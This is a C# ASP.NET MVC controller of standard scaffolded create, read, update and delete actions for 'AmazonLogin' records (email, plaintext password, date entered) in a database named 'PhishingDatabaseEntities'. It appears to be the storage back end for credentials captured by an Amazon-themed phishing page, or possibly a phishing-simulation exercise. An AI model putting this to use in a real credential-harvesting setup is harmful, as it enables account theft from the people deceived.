using System;
using System.Collections.Generic;
using System.Data;
using System.Data.Entity;
using System.Linq;
using System.Net;
using System.Web;
using System.Web.Mvc;
using WebApplicationMVC2.Models;

namespace WebApplicationMVC2.Controllers
{
    public class AmazonLoginsController : Controller
    {
        private PhishingDatabaseEntities db = new PhishingDatabaseEntities();

        // GET: AmazonLogins
        public ActionResult Index()
        {
            var amazonLogin = db.AmazonLogin.Include(a => a.Receiver);
            return View(amazonLogin.ToList());
        }

        // GET: AmazonLogins/Details/5
        public ActionResult Details(int? id)
        {
            if (id == null)
            {
                return new HttpStatusCodeResult(HttpStatusCode.BadRequest);
            }
            AmazonLogin amazonLogin = db.AmazonLogin.Find(id);
            if (amazonLogin == null)
            {
                return HttpNotFound();
            }
            return View(amazonLogin);
        }

        // GET: AmazonLogins/Create
        public ActionResult Create()
        {
            ViewBag.ID = new SelectList(db.Receiver, "ID", "ID");
            return View();
        }

        // POST: AmazonLogins/Create
        // To protect from overposting attacks, enable the specific properties you want to bind to, for 
        // more details see https://go.microsoft.com/fwlink/?LinkId=317598.
        [HttpPost]
        [ValidateAntiForgeryToken]
        public ActionResult Create([Bind(Include = "ID,Email,Password,DateEntered")] AmazonLogin amazonLogin)
        {
            if (ModelState.IsValid)
            {
                db.AmazonLogin.Add(amazonLogin);
                db.SaveChanges();
                return RedirectToAction("Index");
            }

            ViewBag.ID = new SelectList(db.Receiver, "ID", "ID", amazonLogin.ID);
            return View(amazonLogin);
        }

        // GET: AmazonLogins/Edit/5
        public ActionResult Edit(int? id)
        {
            if (id == null)
            {
                return new HttpStatusCodeResult(HttpStatusCode.BadRequest);
            }
            AmazonLogin amazonLogin = db.AmazonLogin.Find(id);
            if (amazonLogin == null)
            {
                return HttpNotFound();
            }
            ViewBag.ID = new SelectList(db.Receiver, "ID", "ID", amazonLogin.ID);
            return View(amazonLogin);
        }

        // POST: AmazonLogins/Edit/5
        // To protect from overposting attacks, enable the specific properties you want to bind to, for 
        // more details see https://go.microsoft.com/fwlink/?LinkId=317598.
        [HttpPost]
        [ValidateAntiForgeryToken]
        public ActionResult Edit([Bind(Include = "ID,Email,Password,DateEntered")] AmazonLogin amazonLogin)
        {
            if (ModelState.IsValid)
            {
                db.Entry(amazonLogin).State = EntityState.Modified;
                db.SaveChanges();
                return RedirectToAction("Index");
            }
            ViewBag.ID = new SelectList(db.Receiver, "ID", "ID", amazonLogin.ID);
            return View(amazonLogin);
        }

        // GET: AmazonLogins/Delete/5
        public ActionResult Delete(int? id)
        {
            if (id == null)
            {
                return new HttpStatusCodeResult(HttpStatusCode.BadRequest);
            }
            AmazonLogin amazonLogin = db.AmazonLogin.Find(id);
            if (amazonLogin == null)
            {
                return HttpNotFound();
            }
            return View(amazonLogin);
        }

        // POST: AmazonLogins/Delete/5
        [HttpPost, ActionName("Delete")]
        [ValidateAntiForgeryToken]
        public ActionResult DeleteConfirmed(int id)
        {
            AmazonLogin amazonLogin = db.AmazonLogin.Find(id);
            db.AmazonLogin.Remove(amazonLogin);
            db.SaveChanges();
            return RedirectToAction("Index");
        }

        protected override void Dispose(bool disposing)
        {
            if (disposing)
            {
                db.Dispose();
            }
            base.Dispose(disposing);
        }
    }
}
